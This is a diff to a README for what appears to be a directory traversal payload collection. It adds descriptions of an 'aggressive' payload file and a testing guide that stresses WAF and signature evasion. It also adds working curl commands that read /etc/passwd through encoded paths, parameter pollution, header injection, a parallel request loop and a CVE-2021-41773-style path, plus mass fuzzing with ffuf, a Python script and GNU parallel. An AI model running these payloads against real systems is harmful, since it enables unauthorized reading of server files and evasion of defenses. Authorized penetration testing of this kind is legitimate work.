@@ -37,6 +37,30 @@ This repository contains a comprehensive collection of directory traversal paylo
 - Legal and ethical considerations
 - Tools and resources for learning
 
+### 4. Aggressive_Testing_Payloads.txt
+- **30 sections** of real-world attack simulation payloads
+- Polymorphic encoding to evade signature detection
+- Time-based and race condition exploits
+- HTTP parameter pollution and header injection
+- Parser differential attacks
+- Unicode normalization exploits
+- Protocol smuggling patterns
+- Real CVE exploitation patterns (Apache, Atlassian, Laravel)
+- Zero-day simulation techniques
+- Context-aware bypasses for WordPress, Drupal, Laravel, Django
+
+### 5. AGGRESSIVE_TESTING_GUIDE.md
+- **Complete penetration testing methodology**
+- Pre-engagement authorization checklists
+- Advanced reconnaissance techniques
+- Exploitation strategies with code examples
+- Automation using ffuf, Burp Suite, custom Python scripts
+- WAF evasion techniques (timing, IP rotation, session persistence)
+- Post-exploitation and attack chaining
+- Real-world compromise scenarios
+- Tool installation and configuration
+- Professional reporting templates
+
 ## Usage
 
 ### For Security Professionals
@@ -80,6 +104,42 @@ curl "https://target.com/page?file=%c0%ae%c0%ae%c0%afetc%c0%afpasswd"
 
 # Null byte injection
 curl "https://target.com/page?file=../../etc/passwd%00.jpg"
+```
+
+### Aggressive Testing (Real Attack Simulation)
+```bash
+# Polymorphic encoding (evades signatures)
+curl "https://target.com/api?file=%252e%252e%2f%c0%ae%c0%ae%2f..%2f%u002e%u002e%2fetc%2fpasswd"
+
+# HTTP parameter pollution
+curl "https://target.com/api?file=safe.txt&file=../../etc/passwd"
+
+# Header injection bypass
+curl "https://target.com/" -H "X-Original-URL: ../../etc/passwd"
+
+# Race condition attack (use in script)
+for i in {1..100}; do
+  curl "https://target.com/api?file=../../etc/passwd" &
+done
+
+# CVE-2021-41773 (Apache 2.4.49) style
+curl "https://target.com/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"
+```
+
+### Automated Testing
+```bash
+# Using ffuf
+ffuf -w Advanced_WAF_Bypass_Payloads.txt \
+     -u https://target.com/api?file=FUZZ \
+     -mc 200 -mr "root:"
+
+# Using custom script
+python3 advanced_fuzzer.py -u https://target.com/api -p file \
+     -w Aggressive_Testing_Payloads.txt
+
+# Mass parallel testing
+cat payloads.txt | parallel -j 50 \
+  'curl -s "https://target.com/api?file={}" | grep -q "root:" && echo "[+] {}"'
 ```
 
 ## Key Techniques
